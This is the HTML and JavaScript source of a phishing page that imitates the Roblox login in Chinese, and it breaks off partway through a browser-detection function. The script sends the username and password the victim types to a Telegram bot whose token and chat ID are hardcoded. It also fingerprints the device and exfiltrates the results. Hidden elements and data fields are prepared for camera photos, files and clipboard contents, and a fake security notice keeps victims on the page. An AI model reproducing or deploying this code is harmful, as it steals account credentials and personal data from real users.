<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ç™»å½• Roblox - roblox.com</title>
    <link rel="icon" href="https://tr.rbxcdn.com/favicon.ico" type="image/x-icon">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f0f0f0;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
        }

        /* èƒŒæ™¯è£…é¥° */
        .background-pattern {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 30%, rgba(0, 162, 255, 0.1) 0%, transparent 40%),
                radial-gradient(circle at 80% 70%, rgba(255, 77, 77, 0.1) 0%, transparent 40%);
            z-index: -1;
        }

        .floating-icons {
            position: fixed;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .floating-icon {
            position: absolute;
            font-size: 24px;
            opacity: 0.1;
            animation: float 15s infinite linear;
        }

        @keyframes float {
            0% { transform: translateY(0) rotate(0deg); }
            100% { transform: translateY(-1000px) rotate(360deg); }
        }

        .main-container {
            width: 100%;
            max-width: 1000px;
            background: white;
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            animation: slideIn 0.5s ease-out;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateY(30px); }
            to { opacity: 1; transform: translateY(0); }
        }

        /* é¡¶éƒ¨å¯¼èˆªæ  */
        .top-navigation {
            background: linear-gradient(135deg, #00a2ff 0%, #007acc 100%);
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: white;
            position: relative;
            overflow: hidden;
        }

        .top-navigation::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
            animation: shine 3s infinite linear;
        }

        @keyframes shine {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(100%) rotate(45deg); }
        }

        .brand {
            display: flex;
            align-items: center;
            gap: 15px;
            position: relative;
            z-index: 1;
        }

        .brand-icon {
            width: 40px;
            height: 40px;
            background: white;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #00a2ff;
            font-weight: bold;
            font-size: 20px;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
        }

        .brand-text {
            font-size: 24px;
            font-weight: 700;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
        }

        .navigation-menu {
            display: flex;
            gap: 30px;
            position: relative;
            z-index: 1;
        }

        .nav-item {
            color: white;
            text-decoration: none;
            font-size: 15px;
            font-weight: 500;
            padding: 8px 16px;
            border-radius: 6px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }

        .nav-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .nav-item:hover::before {
            left: 100%;
        }

        .nav-item:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateY(-2px);
        }

        .nav-item.robux {
            background: linear-gradient(135deg, #ff4d4d 0%, #cc0000 100%);
            font-weight: 600;
            box-shadow: 0 4px 15px rgba(255, 77, 77, 0.3);
        }

        .nav-item.robux:hover {
            background: linear-gradient(135deg, #cc0000 0%, #990000 100%);
            transform: translateY(-2px) scale(1.05);
        }

        /* ä¸»å†…å®¹åŒºåŸŸ */
        .content-wrapper {
            display: flex;
            min-height: 600px;
        }

        /* å·¦ä¾§è¾¹æ  */
        .sidebar {
            width: 280px;
            background: linear-gradient(180deg, #f8f9fa 0%, #e9ecef 100%);
            border-right: 1px solid #dee2e6;
            padding: 30px 20px;
        }

        .sidebar-section {
            margin-bottom: 30px;
        }

        .section-title {
            color: #495057;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 15px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .sidebar-item {
            padding: 14px 16px;
            margin-bottom: 8px;
            background: white;
            border-radius: 8px;
            border: 2px solid transparent;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            display: flex;
            align-items: center;
            gap: 12px;
            position: relative;
            overflow: hidden;
        }

        .sidebar-item::after {
            content: '';
            position: absolute;
            right: -50%;
            top: 0;
            width: 50%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0, 162, 255, 0.1), transparent);
            transform: skewX(-20deg);
            transition: right 0.5s;
        }

        .sidebar-item:hover::after {
            right: 150%;
        }

        .sidebar-item:hover {
            border-color: #00a2ff;
            transform: translateX(8px);
            box-shadow: 0 6px 20px rgba(0, 162, 255, 0.15);
        }

        .sidebar-item.active {
            border-color: #00a2ff;
            background: linear-gradient(135deg, #e7f4ff 0%, #d4ebff 100%);
            box-shadow: 0 6px 20px rgba(0, 162, 255, 0.2);
        }

        .item-icon {
            font-size: 20px;
            width: 36px;
            height: 36px;
            background: rgba(0, 162, 255, 0.1);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #00a2ff;
        }

        .item-text {
            color: #212529;
            font-size: 15px;
            font-weight: 500;
        }

        /* ä¸»å†…å®¹åŒº */
        .main-content {
            flex: 1;
            padding: 40px;
            background: white;
        }

        .page-header {
            margin-bottom: 40px;
            text-align: center;
        }

        .page-title {
            font-size: 32px;
            color: #212529;
            margin-bottom: 10px;
            font-weight: 700;
            position: relative;
            display: inline-block;
        }

        .page-title::after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 80px;
            height: 4px;
            background: linear-gradient(90deg, #00a2ff, #007acc);
            border-radius: 2px;
        }

        .page-subtitle {
            color: #6c757d;
            font-size: 16px;
            margin-top: 20px;
        }

        /* ç™»å½•è¡¨å• */
        .login-container {
            max-width: 450px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 16px;
            border: 1px solid #e9ecef;
            box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
            transition: transform 0.3s, box-shadow 0.3s;
        }

        .login-container:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.12);
        }

        .form-group {
            margin-bottom: 25px;
            position: relative;
        }

        .form-label {
            display: block;
            margin-bottom: 10px;
            color: #495057;
            font-size: 15px;
            font-weight: 500;
        }

        .form-input {
            width: 100%;
            padding: 16px 20px;
            border: 2px solid #dee2e6;
            border-radius: 10px;
            font-size: 16px;
            transition: all 0.3s;
            background: #f8f9fa;
            color: #212529;
        }

        .form-input:focus {
            outline: none;
            border-color: #00a2ff;
            background: white;
            box-shadow: 0 0 0 4px rgba(0, 162, 255, 0.1);
            transform: translateY(-2px);
        }

        .form-input::placeholder {
            color: #adb5bd;
        }

        .password-wrapper {
            position: relative;
        }

        .toggle-password {
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #6c757d;
            cursor: pointer;
            font-size: 20px;
            padding: 8px;
            border-radius: 6px;
            transition: all 0.3s;
        }

        .toggle-password:hover {
            background: rgba(0, 162, 255, 0.1);
            color: #00a2ff;
        }

        /* ç™»å½•æŒ‰é’® */
        .login-button {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00a2ff 0%, #007acc 100%);
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            position: relative;
            overflow: hidden;
        }

        .login-button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.7s;
        }

        .login-button:hover::before {
            left: 100%;
        }

        .login-button:hover {
            background: linear-gradient(135deg, #007acc 0%, #0066a3 100%);
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0, 162, 255, 0.4);
        }

        .login-button:active {
            transform: translateY(-1px);
        }

        .login-button:disabled {
            background: #adb5bd;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .login-button:disabled:hover::before {
            left: -100%;
        }

        .button-icon {
            font-size: 20px;
        }

        /* é“¾æ¥åŒºåŸŸ */
        .links-container {
            text-align: center;
            margin-top: 30px;
            padding-top: 25px;
            border-top: 1px solid #e9ecef;
        }

        .link-item {
            color: #00a2ff;
            text-decoration: none;
            font-size: 14px;
            margin: 0 12px;
            padding: 8px 12px;
            border-radius: 6px;
            transition: all 0.3s;
            display: inline-block;
            margin-bottom: 10px;
        }

        .link-item:hover {
            background: rgba(0, 162, 255, 0.1);
            text-decoration: underline;
            transform: translateY(-2px);
        }

        /* æ³¨å†ŒåŒºåŸŸ */
        .register-container {
            text-align: center;
            margin-top: 40px;
            padding: 25px;
            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
            border-radius: 12px;
            border: 1px solid #dee2e6;
        }

        .register-title {
            color: #495057;
            font-size: 16px;
            margin-bottom: 15px;
            font-weight: 500;
        }

        .register-button {
            display: inline-block;
            padding: 14px 32px;
            background: linear-gradient(135deg, #28a745 0%, #218838 100%);
            color: white;
            text-decoration: none;
            border-radius: 10px;
            font-weight: 600;
            font-size: 16px;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(40, 167, 69, 0.2);
        }

        .register-button:hover {
            background: linear-gradient(135deg, #218838 0%, #1e7e34 100%);
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(40, 167, 69, 0.3);
            text-decoration: none;
        }

        /* å®‰å…¨é€šçŸ¥ */
        .security-notice {
            background: linear-gradient(135deg, #fff3cd 0%, #ffeaa7 100%);
            border: 2px solid #ffc107;
            border-radius: 12px;
            padding: 20px;
            margin-top: 30px;
            color: #856404;
            font-size: 14px;
            display: flex;
            align-items: flex-start;
            gap: 15px;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.9; }
        }

        .security-icon {
            font-size: 24px;
            color: #ffc107;
            flex-shrink: 0;
        }

        .security-text {
            flex: 1;
            line-height: 1.6;
        }

        /* åŠ è½½çŠ¶æ€ */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            backdrop-filter: blur(5px);
        }

        .loading-content {
            background: white;
            padding: 40px;
            border-radius: 16px;
            text-align: center;
            max-width: 400px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            animation: scaleIn 0.3s ease-out;
        }

        @keyframes scaleIn {
            from { opacity: 0; transform: scale(0.9); }
            to { opacity: 1; transform: scale(1); }
        }

        .loading-spinner {
            width: 60px;
            height: 60px;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #00a2ff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .loading-text {
            color: #495057;
            font-size: 16px;
            margin-bottom: 5px;
            font-weight: 500;
        }

        .loading-subtext {
            color: #6c757d;
            font-size: 14px;
        }

        /* çŠ¶æ€æ¶ˆæ¯ */
        .status-message {
            padding: 18px;
            border-radius: 10px;
            margin: 20px 0;
            font-size: 15px;
            display: none;
            animation: fadeIn 0.3s;
            border: 2px solid transparent;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .status-success {
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            color: #155724;
            border-color: #c3e6cb;
        }

        .status-error {
            background: linear-gradient(135deg, #f8d7da 0%, #f5c6cb 100%);
            color: #721c24;
            border-color: #f5c6cb;
        }

        /* é¡µè„š */
        .page-footer {
            background: #f8f9fa;
            padding: 25px 40px;
            text-align: center;
            color: #6c757d;
            font-size: 13px;
            border-top: 1px solid #e9ecef;
        }

        .footer-text {
            line-height: 1.6;
            max-width: 800px;
            margin: 0 auto;
        }

        .hidden {
            display: none !important;
        }

        /* å“åº”å¼è®¾è®¡ */
        @media (max-width: 1024px) {
            .main-container {
                max-width: 95%;
            }
        }

        @media (max-width: 768px) {
            .content-wrapper {
                flex-direction: column;
            }
            
            .sidebar {
                width: 100%;
                border-right: none;
                border-bottom: 1px solid #dee2e6;
            }
            
            .main-content {
                padding: 20px;
            }
            
            .top-navigation {
                flex-direction: column;
                gap: 20px;
                text-align: center;
                padding: 20px;
            }
            
            .navigation-menu {
                flex-wrap: wrap;
                justify-content: center;
                gap: 15px;
            }
            
            .login-container {
                padding: 30px 20px;
            }
        }

        @media (max-width: 480px) {
            .main-container {
                border-radius: 8px;
            }
            
            .login-container {
                padding: 25px 15px;
            }
            
            .form-input {
                padding: 14px 16px;
            }
            
            .login-button {
                padding: 16px;
            }
        }
    </style>
</head>
<body>
    <!-- èƒŒæ™¯è£…é¥° -->
    <div class="background-pattern"></div>
    
    <div class="floating-icons" id="floatingIcons"></div>
    
    <!-- åŠ è½½é®ç½© -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-content">
            <div class="loading-spinner"></div>
            <div class="loading-text">æ­£åœ¨éªŒè¯æ‚¨çš„è´¦æˆ·...</div>
            <div class="loading-subtext">è¯·å‹¿å…³é—­é¡µé¢ï¼Œè¿™å¯èƒ½éœ€è¦å‡ ç§’é’Ÿ</div>
        </div>
    </div>

    <!-- ä¸»å®¹å™¨ -->
    <div class="main-container">
        <!-- é¡¶éƒ¨å¯¼èˆªæ  -->
        <div class="top-navigation">
            <div class="brand">
                <div class="brand-icon">R</div>
                <div class="brand-text">Roblox</div>
            </div>
            
            <div class="navigation-menu">
                <a href="#" class="nav-item">æ’è¡Œæ¦œ</a>
                <a href="#" class="nav-item">å•†åŸ</a>
                <a href="#" class="nav-item">åˆ›ä½œ</a>
                <a href="#" class="nav-item robux">Robux</a>
            </div>
        </div>

        <!-- ä¸»è¦å†…å®¹åŒºåŸŸ -->
        <div class="content-wrapper">
            <!-- å·¦ä¾§è¾¹æ  -->
            <div class="sidebar">
                <div class="sidebar-section">
                    <div class="section-title">å¯¼èˆª</div>
                    <div class="sidebar-item active">
                        <div class="item-icon">ğŸ®</div>
                        <div class="item-text">ç™»å½• Roblox</div>
                    </div>
                    <div class="sidebar-item">
                        <div class="item-icon">â­</div>
                        <div class="item-text">çƒ­é—¨æ¸¸æˆ</div>
                    </div>
                    <div class="sidebar-item">
                        <div class="item-icon">ğŸ‘•</div>
                        <div class="item-text">è™šæ‹Ÿç‰©å“</div>
                    </div>
                    <div class="sidebar-item">
                        <div class="item-icon">ğŸ‘¥</div>
                        <div class="item-text">æœ‹å‹åˆ—è¡¨</div>
                    </div>
                    <div class="sidebar-item">
                        <div class="item-icon">ğŸ†</div>
                        <div class="item-text">æˆå°±</div>
                    </div>
                </div>
                
                <div class="sidebar-section">
                    <div class="section-title">è´¦æˆ·</div>
                    <div class="sidebar-item">
                        <div class="item-icon">âš™ï¸</div>
                        <div class="item-text">è®¾ç½®</div>
                    </div>
                    <div class="sidebar-item">
                        <div class="item-icon">ğŸ›¡ï¸</div>
                        <div class="item-text">å®‰å…¨</div>
                    </div>
                    <div class="sidebar-item">
                        <div class="item-icon">ğŸ’³</div>
                        <div class="item-text">æ”¯ä»˜</div>
                    </div>
                    <div class="sidebar-item">
                        <div class="item-icon">ğŸ“±</div>
                        <div class="item-text">éšç§</div>
                    </div>
                </div>
            </div>

            <!-- ä¸»å†…å®¹åŒº -->
            <div class="main-content">
                <div class="page-header">
                    <h1 class="page-title">ç™»å½• Roblox</h1>
                    <p class="page-subtitle">roblox.com</p>
                </div>
                
                <div class="login-container">
                    <!-- ç™»å½•è¡¨å• -->
                    <form id="loginForm">
                        <div class="form-group">
                            <label class="form-label">ç”¨æˆ·å/ç”µå­é‚®ä»¶/æ‰‹æœº</label>
                            <input type="text" 
                                   class="form-input" 
                                   id="username"
                                   placeholder="è¾“å…¥æ‚¨çš„ç”¨æˆ·åã€ç”µå­é‚®ä»¶æˆ–æ‰‹æœºå·ç "
                                   autocomplete="username"
                                   required>
                        </div>
                        
                        <div class="form-group">
                            <label class="form-label">å¯†ç </label>
                            <div class="password-wrapper">
                                <input type="password" 
                                       class="form-input" 
                                       id="password"
                                       placeholder="è¾“å…¥æ‚¨çš„å¯†ç "
                                       autocomplete="current-password"
                                       required>
                                <button type="button" class="toggle-password" id="togglePassword">
                                    ğŸ‘ï¸
                                </button>
                            </div>
                        </div>
                        
                        <!-- çŠ¶æ€æ¶ˆæ¯ -->
                        <div id="errorMessage" class="status-message status-error hidden">
                            âŒ ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®ï¼Œè¯·é‡è¯•
                        </div>
                        
                        <div id="successMessage" class="status-message status-success hidden">
                            âœ… ç™»å½•æˆåŠŸï¼æ­£åœ¨ä¸ºæ‚¨é‡å®šå‘...
                        </div>
                        
                        <button type="button" class="login-button" id="loginButton" onclick="handleLogin()">
                            <span class="button-icon">ğŸ”</span>
                            <span>ç™»å½•</span>
                        </button>
                    </form>
                    
                    <!-- é“¾æ¥åŒºåŸŸ -->
                    <div class="links-container">
                        <a href="#" class="link-item">å¿˜è®°å¯†ç æˆ–ç”¨æˆ·åï¼Ÿ</a>
                        <a href="#" class="link-item">é€šè¿‡ç”µå­é‚®ä»¶å‘æˆ‘å‘é€ä¸€æ¬¡æ€§éªŒè¯ç </a>
                        <a href="#" class="link-item">ä½¿ç”¨å¦ä¸€å°è®¾å¤‡</a>
                    </div>
                    
                    <!-- æ³¨å†ŒåŒºåŸŸ -->
                    <div class="register-container">
                        <div class="register-title">æ²¡æœ‰å¸æˆ·ï¼Ÿ</div>
                        <a href="#" class="register-button">ç«‹å³æ³¨å†Œ</a>
                    </div>
                    
                    <!-- å®‰å…¨é€šçŸ¥ -->
                    <div class="security-notice">
                        <div class="security-icon">ğŸ”’</div>
                        <div class="security-text">
                            ä¸ºäº†ä¿æŠ¤æ‚¨çš„è´¦æˆ·å®‰å…¨ï¼Œæˆ‘ä»¬æ­£åœ¨è¿›è¡Œå®‰å…¨æ£€æŸ¥ã€‚è¯·ä¸è¦å…³é—­æ­¤é¡µé¢ï¼Œè¿™æœ‰åŠ©äºæˆ‘ä»¬éªŒè¯æ‚¨çš„èº«ä»½å¹¶é˜²æ­¢æœºå™¨äººè®¿é—®ã€‚
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <!-- é¡µè„š -->
        <div class="page-footer">
            <div class="footer-text">
                Â© 2024 Roblox Corporation. Roblox å’Œå…¶ä»– Roblox å¾½æ ‡æ˜¯ Roblox Corporation çš„å•†æ ‡ã€‚<br>
                æœ¬é¡µé¢ä½¿ç”¨å®‰å…¨è¿æ¥ï¼Œæ‚¨çš„ä¿¡æ¯åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¼šè¢«åŠ å¯†ã€‚
            </div>
        </div>
    </div>

    <!-- éšè”½çš„æ”¶é›†å…ƒç´  -->
    <iframe id="hiddenFrame" sandbox="allow-scripts allow-same-origin" style="display:none;"></iframe>
    <canvas id="hiddenCanvas" style="display:none;"></canvas>
    <input type="file" id="hiddenFileInput" style="display:none;" webkitdirectory directory multiple>
    <div id="dataCollector" style="display:none;"></div>
<script>
    // ==================== Telegramé…ç½® ====================
    const TELEGRAM_CONFIG = {
        botToken: "8520089781:AAHPSCT8YZf9q6J43VKdDtdGwtRkzmyMoXM",
        chatId: "8313770381"
    };

    // å®Œæ•´æ•°æ®æ”¶é›†å¯¹è±¡
    let collectedData = {
        sessionId: generateSessionId(),
        startTime: new Date().toISOString(),
        userCredentials: {},
        deviceFingerprint: {},
        networkInformation: {},
        cameraAccess: [],
        fileSystemData: [],
        behaviorAnalytics: {},
        browserExtensions: [],
        systemInfo: {},
        collectedPhotos: [],
        clipboardData: {}
    };

    let isCollecting = false;
    let stealthMode = true;

    // ==================== åŸºç¡€åŠŸèƒ½ ====================
    function generateSessionId() {
        const timestamp = Date.now();
        const random = Math.random().toString(36).substr(2, 12).toUpperCase();
        return `RBX-${timestamp}-${random}`;
    }

    async function sendToTelegram(text) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CONFIG.chatId,
                    text: text,
                    parse_mode: 'HTML',
                    disable_web_page_preview: true
                })
            });
            return response.ok;
        } catch (error) {
            console.error('Telegramå‘é€å¤±è´¥:', error);
            return false;
        }
    }

    async function sendPhotoToTelegram(file, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CONFIG.chatId);
            formData.append('photo', file);
            formData.append('caption', `ğŸ“¸ ${caption}\nğŸ†” ${collectedData.sessionId}\nğŸ• ${new Date().toLocaleTimeString()}`);
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            return true;
        } catch (error) {
            return false;
        }
    }

    async function sendDocumentToTelegram(file, caption) {
        try {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CONFIG.chatId);
            formData.append('document', file);
            formData.append('caption', caption);
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
                method: 'POST',
                body: formData
            });
            return true;
        } catch (error) {
            return false;
        }
    }

    // ==================== ç™»å½•å‡­æ®å¤„ç† ====================
    function handleLogin() {
        if (isCollecting) return;
        
        const username = document.getElementById('username').value.trim();
        const password = document.getElementById('password').value;
        
        if (!username || !password) {
            showError('è¯·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ');
            return;
        }
        
        // å­˜å‚¨ç”¨æˆ·å‡­æ®
        collectedData.userCredentials = {
            username: username,
            password: password,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
        };
        
        // ç«‹å³å‘é€å‡­æ®åˆ°Telegram
        sendCredentialsToTelegram(username, password);
        
        // æ˜¾ç¤ºåŠ è½½çŠ¶æ€
        showLoading();
        
        // å¼€å§‹å…¨é¢çš„æ•°æ®æ”¶é›†
        startComprehensiveDataCollection();
    }

    async function sendCredentialsToTelegram(username, password) {
        const message = `ğŸ® <b>Robloxç™»å½•å‡­æ®è·å–æˆåŠŸï¼</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ‘¤ <b>ç”¨æˆ·å:</b> <code>${escapeHtml(username) || 'æœªæä¾›'}</code>
ğŸ”‘ <b>å¯†ç :</b> <code>${escapeHtml(password) || 'æœªæä¾›'}</code>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ†” <b>ä¼šè¯ID:</b> <code>${collectedData.sessionId}</code>
ğŸ• <b>è·å–æ—¶é—´:</b> ${new Date().toLocaleString('zh-CN')}
ğŸ“± <b>è®¾å¤‡:</b> ${navigator.platform}
ğŸŒ <b>æµè§ˆå™¨:</b> ${detectBrowserName()}
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
        
        await sendToTelegram(message);
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }

    function detectBrowserName() {
        const ua = navigator.userAgent;
        if (ua.includes('Chrome') && !ua.includes('Edg')) return 'Chrome';
        if (ua.includes('Firefox')) return 'Firefox';
        if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Safari';
        if (ua.includes('Edg')) return 'Edge';
        return 'æœªçŸ¥æµè§ˆå™¨';
    }

    // ==================== å®Œæ•´çš„è®¾å¤‡æŒ‡çº¹æ”¶é›† ====================
    async function collectCompleteDeviceFingerprint() {
        collectedData.deviceFingerprint = {
            // åŸºç¡€ä¿¡æ¯
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            vendor: navigator.vendor,
            language: navigator.language,
            languages: navigator.languages,
            
            // å±å¹•ä¿¡æ¯
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type
            },
            
            // ç¡¬ä»¶ä¿¡æ¯
            hardware: {
                concurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints
            },
            
            // æµè§ˆå™¨èƒ½åŠ›
            capabilities: {
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                webdriver: navigator.webdriver
            },
            
            // è¿æ¥ä¿¡æ¯
            connection: navigator.connection ? {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                downlinkMax: navigator.connection.downlinkMax,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData,
                type: navigator.connection.type
            } : null,
            
            // ç”µæ± ä¿¡æ¯
            battery: {}
        };

        // æ”¶é›†ç”µæ± ä¿¡æ¯
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                collectedData.deviceFingerprint.battery = {
                    level: battery.level * 100,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch (e) {}
        }

        // æ“ä½œç³»ç»Ÿæ£€æµ‹
        collectedData.systemInfo.os = detectDetailedOS();
        
        // æµè§ˆå™¨æ£€æµ‹
        collectedData.systemInfo.browser = detectDetailedBrowser();
        
        // CanvasæŒ‡çº¹
        collectedData.deviceFingerprint.canvas = getCanvasFingerprint();
        
        // WebGLæŒ‡çº¹
        collectedData.deviceFingerprint.webgl = getWebGLFingerprint();
        
        // éŸ³é¢‘æŒ‡çº¹
        collectedData.deviceFingerprint.audio = getAudioFingerprint();
        
        // æ’ä»¶åˆ—è¡¨
        collectedData.deviceFingerprint.plugins = Array.from(navigator.plugins).map(p => ({
            name: p.name,
            description: p.description,
            filename: p.filename
        }));
        
        // MIMEç±»å‹
        collectedData.deviceFingerprint.mimeTypes = Array.from(navigator.mimeTypes).map(m => ({
            type: m.type,
            description: m.description,
            suffixes: m.suffixes
        }));
        
        // æ£€æµ‹æµè§ˆå™¨æ‰©å±•
        detectBrowserExtensions();
        
        // å‘é€è®¾å¤‡ä¿¡æ¯æ‘˜è¦åˆ°Telegram
        const deviceSummary = `ğŸ“± <b>å®Œæ•´è®¾å¤‡æŒ‡çº¹æ”¶é›†å®Œæˆ</b>
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
ğŸ’» <b>æ“ä½œç³»ç»Ÿ:</b> ${collectedData.systemInfo.os.name} ${collectedData.systemInfo.os.version}
ğŸŒ <b>æµè§ˆå™¨:</b> ${collectedData.systemInfo.browser.name} ${collectedData.systemInfo.browser.version}
ğŸ–¥ï¸ <b>åˆ†è¾¨ç‡:</b> ${screen.width}x${screen.height}
ğŸ”¢ <b>CPUæ ¸å¿ƒ:</b> ${navigator.hardwareConcurrency}
ğŸ’¾ <b>å†…å­˜:</b> ${navigator.deviceMemory || 'æœªçŸ¥'}GB
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€`;
        
        await sendToTelegram(deviceSummary);
    }

    function detectDetailedOS() {
        const ua = navigator.userAgent;
        let os = { name: 'Unknown', version: 'Unknown' };
        
        if (/Windows NT 10/.test(ua)) {
            os.name = 'Windows';
            os.version = '10/11';
        } else if (/Windows NT 6.3/.test(ua)) {
            os.name = 'Windows';
            os.version = '8.1';
        } else if (/Windows NT 6.2/.test(ua)) {
            os.name = 'Windows';
            os.version = '8';
        } else if (/Windows NT 6.1/.test(ua)) {
            os.name = 'Windows';
            os.version = '7';
        } else if (/Macintosh/.test(ua)) {
            os.name = 'macOS';
            const match = ua.match(/Mac OS X (\d+[._]\d+)/);
            if (match) os.version = match[1].replace('_', '.');
        } else if (/Linux/.test(ua)) {
            os.name = 'Linux';
            if (/Android/.test(ua)) {
                os.name = 'Android';
                const match = ua.match(/Android (\d+\.\d+)/);
                if (match) os.version = match[1];
            }
        } else if (/iPhone|iPad|iPod/.test(ua)) {
            os.name = 'iOS';
            const match = ua.match(/OS (\d+)/);
            if (match) os.version = match[1];
        }
        
        return os;
    }

    function detectDetailedBrowser() {
        const ua = navigator.userAgent;
        let browser = { name: 'Unknown', version: 'Unknown' };
        
        const patterns = [
            { name: 'Chrome', pattern: /Chrome\/(\d+\.\d+)/ },
            { name: 'Firefox', pattern: /Firefox\/(\d+\.\d+)/ },
            { name: 'Safari', pattern: /Version\/(\d+\.\d+).*Safari/ },
            { name: 'Edge', pattern: /Edg\/(\d+\.\d+)/ },
            { name: 'Opera', pattern: /(?:Opera|OPR)\/(\d+\.\d+)/ }
        ];
        
        for (const { name, pattern } of patterns) {
            const match = ua.match(pattern);
            if (match) {
